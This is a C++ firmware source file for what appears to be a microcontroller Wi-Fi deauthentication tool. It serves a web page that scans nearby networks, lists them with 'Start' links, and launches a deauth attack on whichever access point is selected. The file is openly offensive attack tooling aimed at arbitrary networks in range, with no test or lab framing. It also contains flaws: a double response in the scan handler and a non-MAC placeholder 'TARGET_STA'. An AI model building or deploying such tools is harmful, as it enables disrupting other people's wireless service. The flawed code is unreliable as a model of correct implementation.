#include "Web/Web.h"
#include "Networks/Services/AttackService.h"

extern AttackService attackService;
void Web::init(){
    setUpEndpoints();
    server.begin();
}

void Web::handle() {
    server.handleClient();
}

void Web::setUpEndpoints(){
    server.on("/", [this]() {
        server.send(200, "text/html", "<h1>Hello World!</h1>");
        led.blink(5);
    });

    server.on("/scan", [this]() {
        wifi.scanAPs();
        auto nets = wifi.getScannedAPs();
        String html = "Wait a second..";

        server.send(200, "text/html", html);

        html = "<h1>Scanned Networks</h1><ul>";
        for (size_t i = 0; i < nets.size(); i++) {
            html += "<li>" + nets[i].ssid + " (RSSI " + String(nets[i].rssi) + ")";
            html += " <a href='/start/" + String(i) + "'>Start</a></li>";
        }
        html += "</ul>";
        server.send(200, "text/html", html);
    });

    // Handle /start/{id}
    server.onNotFound([this]() {
        String uri = server.uri();
        if (uri.startsWith("/start/")) {
            int id = uri.substring(7).toInt();
            auto nets = wifi.getScannedAPs();

            if (id >= 0 && id < (int)nets.size()) {
                AccessPoint ap = nets[id];

                // Call AttackService with AP and dummy STA (or same AP if you don’t need STA)
                MacAddress apMac = ap.bssid;   // assuming AccessPoint has bssid field
                MacAddress staMac{"TARGET_STA"};           // placeholder, fill if needed

                attackService.startDeauthAttack(apMac, staMac, DEFAULT_SECONDS_DEAUTH);

                String msg = "Started attack on: " + ap.ssid;
                server.send(200, "text/plain", msg);
            } else {
                server.send(404, "text/plain", "Invalid network ID");
            }
        } else {
            server.send(404, "text/plain", "Not found");
        }
    });
}
